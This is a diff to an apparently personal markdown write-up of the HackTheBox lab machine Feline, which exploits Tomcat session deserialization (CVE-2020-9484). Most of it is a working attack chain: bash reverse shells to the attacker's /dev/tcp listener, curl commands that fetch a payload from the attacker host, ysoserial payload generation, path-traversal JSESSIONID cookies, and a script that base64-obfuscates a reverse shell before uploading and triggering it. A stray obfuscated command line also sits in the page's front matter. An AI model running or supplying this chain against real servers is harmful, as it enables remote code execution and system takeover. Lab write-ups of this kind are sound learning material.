@@ -21,6 +21,9 @@ tags: [Lab, HackTheBox]
 
 ---
 
+hexout="bash -c {echo,$(echo -n $cmd | base64) }|{base64,-d}|{bash,-i}"
+
+
 
 # Feline
 
@@ -28,12 +31,56 @@ tags: [Lab, HackTheBox]
 > Machine: Feline
 
 
+```
+1. use nmap to find the open port
+2. find the open port 8080
+3. investiate the webpage, it allows upload file
+4. burpsuite the request
+   - able to diy the file name
+   - upload file content was been shown in post request
+   - bad deserialize
+5. find the CVE - 2020 - 9484
+6. resend the request with empty filename
+   - find the upload page: /upload.jsp
+   - find the upload path: /opt/samples/uploads
+
+7. create playload.sh 
+   - bash -c "bash -i >& /dev/tcp/10.10.15.118(your ip)/2424 0>&1"
+   - (reverse shell code)
+ 
+8. create uploadfile.session 
+   - curl http://10.10.15.118(your ip)/play1.sh -o /tmp/targetplay.sh
+   - (upload the reverse shell code and store ie in /tmp/targetplay.sh)
+
+9. create executefile.session 
+   - bash /tmp/targetplay.sh
+   - (exccute the targetplay.sh)
+
+10. create curlcommand.sh
+    - send curl command with the cookie and malicious files.
+
+    bash:
+    vim curlcomand.sh
+    # !/bin/bash
+    curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../opt/samples/uploads/uploadfile' -F 'image=@uploadfile.session'
+    sleep 1
+    curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../opt/samples/uploads/executefile' -F 'image=@executefile.session'
+
+
+11. setup pyserver
+
+12. setup netcat listener
+
+13. run curlcommand and get the reverse shell
+```
+
+---
+
 ## Initial：
 
+---
 
 ### Recon NMAP
-
-
 
 NMAP:
 - <font color=red> FINDING </font>
@@ -206,7 +253,9 @@ CVE requirement:
 
 
 play1.sh (reverse shell code)
+
 uploadfile.session (upload the reverse shell code and store ie in /tmp/targetplay.sh)
+
 executefile.session (exccute the targetplay.sh)
 
 
@@ -216,21 +265,24 @@ executefile.session (exccute the targetplay.sh)
     ```bash
     vim play1.sh
     # !/bin/bash
-    bash -c "bash -i >& /dev/tcp/10.10.10.14/2424 0>&1"
+    bash -c "bash -i >& /dev/tcp/10.10.15.118(your ip)/2424 0>&1"
     ```
 
 2. download the ysoserial source code
    - [使用github上的ysoserial工具](https://github.com/frohoff/ysoserial)
    - download the lastest jar from [JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
 
-
     ```bash
+    git clone https://github.com/frohoff/ysoserial.git
+
     # 1. list the argu
     $  java -jar ysoserial.jar
     # Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
 
     # 2. create seialized session file to download our payload with curl
-    java -jar ysoserial.jar CommonsCollections2 "curl http://10.10.10.14/play1.sh -o /tmp/targetplay.sh" > uploadfile.session
+    java -jar ysoserial.jar CommonsCollections2 "curl http://(your ip)/play1.sh -o /tmp/targetplay.sh" > uploadfile.session
+
+    java -jar ysoserial.jar CommonsCollections2 "curl http://10.10.15.118/play1.sh -o /tmp/targetplay.sh" > uploadfile.session
 
     # 3. create second serizlized session file to execute the payload
     java -jar ysoserial.jar CommonsCollections2 "bash /tmp/targetplay.sh" > executefile.session
@@ -238,15 +290,15 @@ executefile.session (exccute the targetplay.sh)
 
 3. send curl command with the cookie and malicious files.
 
-    ```bash
-    vim curlcomand.sh
-    # !/bin/bash
-    curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../opt/samples/uploads/uploadfile' -F 'image=@uploadfile.session'
-    sleep 1
-    curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../opt/samples/uploads/executefile' -F 'image=@executefile.session'
-    ```
+```bash
+# vim curlcomand.sh
+# !/bin/bash
+curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../tmp/uploadfile' -F 'image=@uploadfile.session'
+sleep 1
+curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../tmp/executefile' -F 'image=@executefile.session'
+```
 
-3. setup listener for the reverse shell and webserver for the payload downloaded by the target
+4. setup listener for the reverse shell and webserver for the payload downloaded by the target
 
     ```bash
     # tab1:
@@ -264,6 +316,32 @@ executefile.session (exccute the targetplay.sh)
 
 ---
 
+
+
+```bash 
+#set command line paramters
+ip=$1
+port=$2
+
+#reverse shell
+cmd="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+
+# fux it with base64
+hexout="bash -c {echo, $(echo -n $cmd | base64)} | {base64,-d} | {bash,-i}"
+
+#create yoserial payload
+java -jar ysoserial.jar CommonsCollections4 "$hexout" > /tmp/playload.session
+
+#upload the payload 
+curl -s -F "data=@/tmp/playload.session" http://10.10.10.205:8080/upload.jsp?email=bob@bob.com > /dev/null
+
+#reference paylaod in cookie
+curl -s http://10.10.10.205:8080/ -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/playload" > /dev/null
+
+
+
+./test.sh $ip $port
+```
 
 ## Access extension
 
